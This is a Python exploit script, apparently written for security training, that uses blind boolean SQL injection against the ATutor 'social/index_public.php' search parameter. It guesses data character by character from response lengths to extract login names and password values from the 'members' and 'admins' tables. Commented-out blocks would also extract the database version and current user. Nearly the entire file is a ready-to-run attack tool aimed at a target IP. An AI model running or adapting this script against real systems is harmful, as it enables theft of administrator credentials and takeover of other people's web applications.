import sys
import re
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style

def fromat_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
    return text

def searchFriends_sqli(ip, inj_str):
    for j in range(32,126):
        target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_lenght = int(r.headers['Content-Length'])
        if (content_lenght > 20):
            return j
    return None

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target> <injection_string>" % sys.argv[0])
        print("(+) eg: %s 192.168.121.103 \"aaa\"" % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    extracted_string = ""

    print("(+) Retriving first user from the members table:")
    for i in range(1,30):
        injection_string = "test')/**/or/**select/**/ascii(substring((SELECT/**/login/**/FROM/**/members/**/LIMIT/**/1),%d,1))=[CHAR]%%23" % (i)
        extracted_char = searchFriends_sqli(ip, injection_string)
        if extracted_char is None:
            break
        extracted_string += str(chr(extracted_char))

    print("(+) Done the string is %s" %extracted_string)

    extracted_string = ""

    print("(+) Retriving first user password:")
    for i in range(1,70):
        injection_string = "test')/**/or/**select/**/ascii(substring((SELECT/**/password/**/FROM/**/members/**/LIMIT/**/1),%d,1))=[CHAR]%%23" % (i)
        extracted_char = searchFriends_sqli(ip, injection_string)
        if extracted_char is None:
            break
        extracted_string += str(chr(extracted_char))

    print("(+) Done the string is %s" %extracted_string)

    extracted_string = ""

    print("(+) Retriving first admin from the admins table:")
    for i in range(1,30):
        injection_string = "test')/**/or/**select/**/ascii(substring((SELECT/**/login/**/FROM/**/admins/**/LIMIT/**/1),%d,1))=[CHAR]%%23" % (i)
        extracted_char = searchFriends_sqli(ip, injection_string)
        if extracted_char is None:
            break
        extracted_string += str(chr(extracted_char))

    print("(+) Done the string is %s" %extracted_string)

    extracted_string = ""

    print("(+) Retriving admin  password:")
    for i in range(1,70):
        injection_string = "test')/**/or/**select/**/ascii(substring((SELECT/**/password/**/FROM/**/admins/**/LIMIT/**/1),%d,1))=[CHAR]%%23" % (i)
        extracted_char = searchFriends_sqli(ip, injection_string)
        if extracted_char is None:
            break
        extracted_string += str(chr(extracted_char))

    print("(+) Done the string is %s" %extracted_string)
    # extracted_string = ""
    #
    # print("(+) Retriving database version:")
    # for i in range(1,30):
    #     injection_string = "test')/**/or/**select/**/ascii(substring((select/**/version()),%d,1))=[CHAR]%%23" % (i)
    #     extracted_char = searchFriends_sqli(ip, injection_string)
    #     if extracted_char is None:
    #         break
    #     extracted_string += str(chr(extracted_char))
    #
    # print("(+) Done the string is %s" %extracted_string)
    #
    # extracted_string = ""
    #
    # print("(+) Retriving user context:")
    # for i in range(1,30):
    #     injection_string = "test')/**/or/**select/**/ascii(substring((select/**/current_user()),%d,1))=[CHAR]%%23" % (i)
    #     extracted_char = searchFriends_sqli(ip, injection_string)
    #     if extracted_char is None:
    #         break
    #     extracted_string += str(chr(extracted_char))
    #
    # print("(+) Done the string is %s" %extracted_string)

if __name__ == "__main__":
    main()
